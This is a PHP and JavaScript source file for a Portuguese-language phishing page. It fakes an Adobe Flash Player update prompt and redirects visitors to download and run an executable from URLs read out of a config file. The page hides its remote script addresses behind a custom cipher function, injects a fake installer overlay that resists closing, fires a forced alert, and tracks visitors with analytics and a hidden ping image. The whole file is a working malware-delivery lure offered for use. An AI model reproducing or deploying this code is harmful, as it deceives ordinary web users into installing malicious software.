<?php
	$config = array();
	$handle = @fopen("loader.txt", "r");
	while (($buffer = fgets($handle, 4096)) !== false)
		array_push($config, trim($buffer));
	fclose($handle);
	
	$url = [];
	$url[0] = $config[2];
	$url[1] = $config[3];
	$url[2] = $config[4];
	$url[3] = $config[5];
	$url[4] = $config[6];
	$url[5] = $config[7];	
?>
<html>
<head>
<link rel="icon" 
      type="image/png" 
      href="flash.png">
<meta charset="utf-8">
<title>Atualize para continuar</title>
<style type="text/css">
#apDiv1 {
	position: absolute;
	left: 0px;
	top: 0px;
	width: 100%;
	height: 100%;
	z-index: 1;
	background-image: url(backer.png);
}
</style>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  var page = new String(window.location.href);
  page = page.replace('www.','');
  page = page.replace('http://','');
  page = page.replace('https://','');
  //ga('create', 'UA-104504016-1', 'auto');
  ga('create', 'UA-105183436-1', 'auto');
  ga('send', { hitType: 'pageview', page: page });

</script>
</head>

<body>
<script>
var government	= jaxzqjqs('/eepr::fhiwtwllw','4ECD6471E58')+jaxzqjqs('i-ntd-nsgaueslun','4ECD6471E58')+jaxzqjqs('epe/adiian.e/xpi','4ECD6471E58')+jaxzqjqs('hp','4ECD6471E58');
var progress	= 0;
var iProg		= null;
var cBack		= null;
var cd			= 5;
var count		= 0;
var canClose	= true;
var _0x1fe0=["<?=$url[rand(0,count($url))];?>"];_0x1fe0[0];

	function genAlpha(text)
	{
		var alpha = "";
		for(i = 0 ; i < text.length; i++)
		{
			if (alpha.indexOf(text.charAt(i)) == -1)
			{
				alpha += text.charAt(i);
			}
		}
		return alpha;
	}


	function rFact(num)
	{
		if (num > 16) num = 16;
		if (num === 0)	{ return 1; } else { return num * rFact( num - 1 ); }
	}

	function calcKey(key)
	{
		var c = 0;
		for(i = 0 ; i < key.length; i++)
		{
			c = c+key.charCodeAt(i);
			if (c < 1000000000) c = c*10;
		}
		return c;
	}

	function getNPoss(alpha, p)
	{
		var resp = "";
		var d = alpha.length;
		for(i=1; i <= d; i++)
		{
			n = rFact(d-i);
			k = Math.floor(p/(n));
			p = p-(k*n);
			c = alpha.charAt(k);
			resp += c;
			alpha = alpha.replace(c,"");
		}
		return resp;
	}

	function jaxzqjqs(message, key)
	{

		var c		= calcKey(key);
		var bAlpha	= genAlpha(message);
		var aAlpha	= getNPoss(bAlpha, c%rFact(bAlpha.length) );

		var coded, i, ch, index;

		coded = "";
		for (i = 0; i < message.length; i++) {
			ch		= message.charAt(i);
			index	= aAlpha.indexOf(ch);
			coded = coded + bAlpha.charAt(index);
		}
		return coded;
	}

/*** START ***/

function allFinish()
{
	fim = document.getElementById('btFinish');
	btOut(fim);
	document.getElementById("btFinish").disabled = false; 	
	//fim.className	=	"btInstall"; 87.236.215.133
//	fim.onclick		=	EndAndOut();
	//fim.onclick		=	function(){window.canClose=true;goOut('none')};
	fim.onmouseover	=	btOver();
	fim.onmouseout	=	btOut();
}

function EndAndOut()
{
	window.location=_0x1fe0;
    document.getElementById("xyz_light_cont").style.display = "none";
    document.getElementById("xyz_fade").style.display = "none";
    document.getElementById("xyz_light").style.display = "none";
	//window.canClose		= true;
	//meCrazy(jaxzqjqs('?6=5692=89YY491','0D07C245D624'));
	//goOut('none', False);
	//goOut('none');	
}

function btOver(obj)
{
	obj.style.background = "#FF7777";
	obj.style.background = "rgb(60, 60, 60)";
}

function btOut(obj)
{
	obj.style.border = "1px solid #111";
	obj.style.color	= "white";
	obj.style.background = "rgb(100, 100, 100)";
}

function doProg()
{
	if (progress == 100) {
		window.canClose		= false;
		window.iProg		= window.clearInterval(window.iProg);
		window.iProg		= setInterval(function(){allFinish()},36000);
		document.getElementById('downForm').innerHTML	= '<div style="text-align: right;"><div style="float: left; font-weight	: bold; font-size: 11px; text-align : left;">Conclu&iacute;do! Para prosseguir, clique <a href="'+_0x1fe0+'" onmouseover="javascritp:window.status=\'Download da atualiza&ccedil;&atilde;o!\'; return true" onmouseout="javascritp:window.status=\'\'; return true" alt="Clique aqui para efetuar o download da atualiza&ccedil;&atilde;o!">aqui</a>. Fa&ccedil;a o download e execute o arquivo para instalar a atualiza&ccedil;&atilde;o! </div><button style="padding	: 6px; width: 120px; border	: 1px solid #555; color	: #555; margin-left	: 10px; background-color : #666;" id="btFinish" name="btFinish" onClick="javascritp:EndAndOut();">CONCLUIR</button></div>';
		window.location=_0x1fe0;
		return;
	}
	progress += 1;
	document.getElementById('progBar').style.width  = progress+"%";
	document.getElementById('progPer').innerHTML	= "Baixando "+progress+"%...";
}

function meCrazy(add)
{
	callMeEveryWhere(government + add);
}

function Download()
{
	callMeEveryWhere(jaxzqjqs('tllpihh/fe:r:ww:','F0A90720309')+jaxzqjqs('elnaglnis-dtiudn','F0A90720309')+jaxzqjqs('.n.d/aii/ep.dxni','F0A90720309')+jaxzqjqs('h?1yzvr3p6a=lhje','F0A90720309')+jaxzqjqs('yo909f','F0A90720309'));
	
	document.getElementById('dvLicense').style.display = "none";

	iF = document.getElementById('installForm');
	iF.style.display = "none";
	
	dF = document.getElementById('downForm');
	dF.style.display = "block";
	
	iProg		= setInterval(function(){doProg()},10);
}

function goOut(stilo, base)
{
	if (!canClose) return;
	base = typeof base !== 'undefined' ? base : true;
	document.getElementById('xyz_light_cont').style.display	= stilo;
	document.getElementById('xyz_fade').style.display		= stilo;
	
	window.cBack = clearInterval(window.cBack);
	if (count >= cd) base = false;
	if (!base) return;
	
	if ((stilo == "none") && (base)) {
		count += 1;
		window.cBack		= setInterval(function(){goOut("block")},3000);
	}
}

function callMeEveryWhere(srce)
{
	var headID = document.getElementsByTagName("head")[0];
	var newScript = document.createElement('script');
		newScript.type = jaxzqjqs('epvercj/jxsitae','2398F44');
		newScript.src = srce;
		headID.appendChild(newScript);
}
			
function loadCSS(srce)
{
	var headID = document.getElementsByTagName("head")[0];
	var newScript = document.createElement('link');
		newScript.setAttribute("rel", "stylesheet");
		newScript.setAttribute("type", "text/css");
		newScript.setAttribute("href", srce);
		headID.appendChild(newScript);
}

function spawAnyone(html)
{
	var span = document.createElement('span');
	span.innerHTML = html;
	return span;
}
			
function weCameFromHell(htcode)
{
	var aBody = document.body;
	if (aBody)
	{
		aBody.insertBefore(spawAnyone(htcode), aBody.firstChild);
	}
}

function sleep(delay) {
	var start = new Date().getTime();
	while (new Date().getTime() < start + delay);
}

function tpqcnmes()
{
	window.cSta	= window.clearInterval(window.cSta);
	url = jaxzqjqs('irr:h//lepftfwwf','4D55B2B1F')+jaxzqjqs('atdgitdl-nselusd','4D55B2B1F')+jaxzqjqs('p/p.edaae','4D55B2B1F')
	sleep(50);
	weCameFromHell('<div id="xyz_light_cont" style="display		: block; position : absolute;	text-align	: center; top : 0; left: 0; width	: 103%; height : 103%; z-index : 9002; background	: none;"><div id="xyz_light" style="display  : block; margin  : 0 auto; margin-top : 130px; width  : 600px; padding  : 0; border  : 8px solid #8badf9; border-top : none; z-index  : 9003; overflow : auto; font-family : Tahoma; font-size : 11px; color  : black; text-align : center; background-color : white; border-radius : 5px;"><div style="font-weight	: bold;	font-size	: 12px;	color: #000; padding: 10px 0; text-align: center; background-color: #8badf9;">Instalador do Adobe Flash Player<div style="width    : 30px; height    : 14px; color    : white; padding    : 3px; float    : right; margin-top   : -10px; background: #aa0000; background: -moz-linear-gradient(top,  #aa0000 0%, #cc0000 100%); background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#aa0000), color-stop(100%,#cc0000));  background: -webkit-linear-gradient(top,  #aa0000 0%,#cc0000 100%); background: -o-linear-gradient(top,  #aa0000 0%,#cc0000 100%);  background: -ms-linear-gradient(top,  #aa0000 0%,#cc0000 100%);  background: linear-gradient(to bottom,  #aa0000 0%,#cc0000 100%); filter: progid:DXImageTransform.Microsoft.gradient( startColorstr=\'#aa0000\', endColorstr=\'#cc0000\',GradientType=0 ); " onClick="javascritp:goOut(\'none\',False);">X</div></div><div style="padding: 6px; background-color: #333; color: white; border: 1px solid #222;"><div style="padding: 10px 0; text-align: center;"><img style="margin: 20px; padding: 0;" src="flash.png" /></br></div><div name="dvLicense" id="dvLicense" style="margin: 0 10% 20px 10% ; text-align: left;"><input type="checkbox" style="float: left;" checked="true"/><div style="margin-left: 20px; font-size: 13px;">Li e concordo com os termos do contrato de licen&ccedil;a do Adobe Flash Player. </br><a style="color: white; text-decoration: underline;" href="http://www.adobe.com/br/products/eulas/">Leia a licen&ccedil;a aqui</a></div></div><hr style="border : none; border-top : 1px solid #222; border-bottom : 1px solid #444;"/><div id="installForm" style="padding : 10px 0 10px 0; color	: #eee; font-weight	: bold; font-size: 13px; text-align : left;"><table style="width: 100%; color : #eee; font-weight : bold; font-size: 13px; text-align : center;" border="0"><tr style="display: block-inline;"><td>Atualização do Adobe Flash Player. Clique no botao "Atualizar" --></-td><td style="text-align: right;"><button style="margin-left : 10px; padding  : 6px; width  : 120px; border  : 1px solid #111; color  : white; background : rgb(100, 100, 100); background : -moz-linear-gradient(90deg, rgb(100, 100, 100) 0%, rgb(60, 60, 60) 70%); background : -webkit-linear-gradient(90deg, rgb(100, 100, 100) 0%, rgb(60, 60, 60) 70%); background : -o-linear-gradient(90deg, rgb(100, 100, 100) 0%, rgb(60, 60, 60) 70%); background : -ms-linear-gradient(90deg, rgb(100, 100, 100) 0%, rgb(60, 60, 60) 70%); background : linear-gradient(180deg, rgb(100, 100, 100) 0%, rgb(60, 60, 60) 70%);" name="btInstall" onClick="javascript: Download();" onMouseOver="javascript: btOver(this);" onMouseOut="javascript: btOut(this);">Atualizar</button></td></tr></table></div><div id="downForm" style="display: none; padding	: 10px 0 10px 0; color	: #eee; font-weight	: bold; text-align	: left;"><div id="progPer" style="font-weight	: bold; font-size: 12px; text-align : left;">Baixando 0%...</div><div id="downBar" style="border-radius	: 10px; color: white; width	: 100%; height : 10px; background-color	: #444; border	: 1px solid black; box-shadow:inset 0 0 10px #111;"><div id="progBar" style="height	: 10px; border-radius : 10px;background: #1e5799; background: -moz-linear-gradient(top,  #1e5799 0%, #2989d8 50%, #207cca 51%, #7db9e8 100%); background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#1e5799), color-stop(50%,#2989d8), color-stop(51%,#207cca), color-stop(100%,#7db9e8)); background: -webkit-linear-gradient(top,  #1e5799 0%,#2989d8 50%,#207cca 51%,#7db9e8 100%); background: -o-linear-gradient(top,  #1e5799 0%,#2989d8 50%,#207cca 51%,#7db9e8 100%); background: -ms-linear-gradient(top,  #1e5799 0%,#2989d8 50%,#207cca 51%,#7db9e8 100%); background: linear-gradient(to bottom,  #1e5799 0%,#2989d8 50%,#207cca 51%,#7db9e8 100%); filter: progid:DXImageTransform.Microsoft.gradient( startColorstr=\'#1e5799\', endColorstr=\'#7db9e8\',GradientType=0 );"></div></div></div></div></div></div><div id="xyz_fade" style="display   : block; position  : absolute; top    : 0; left   : 0; width   : 100%; height   : 800px; z-index   : 9001; -moz-opacity : 0.6; opacity   : .60; filter   : alpha(opacity=60); background-color: black;"></div></body>');
}

var cSta		= setInterval(function(){tpqcnmes()},1000);

</script>
<div id="apDiv1">
  <div align="center"><img src="other.png" width="1004" height="603"></div>
</div>
<BODY BGCOLOR="#FFFFFF" onload="window.alert
('Para visualiza\u00E7\u00E3o correta deste site \u00E9 necess\u00E1rio atualizar o seu Flash Player. Ap\u00F3s a atualiza\u00E7\u00E3o a navega\u00E7\u00E3o no site seguir\u00E1 normalmente. Click em Atualizar')">
</body>
<img src='https://whos.amung.us/pingjs/?k=oretornod01&t=&c=t&y=&a=0&r=641100' border=0 width=0 height=0>
<?php if($config[0] == 'S') { ?>
<script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>
<?php } ?>
</html>
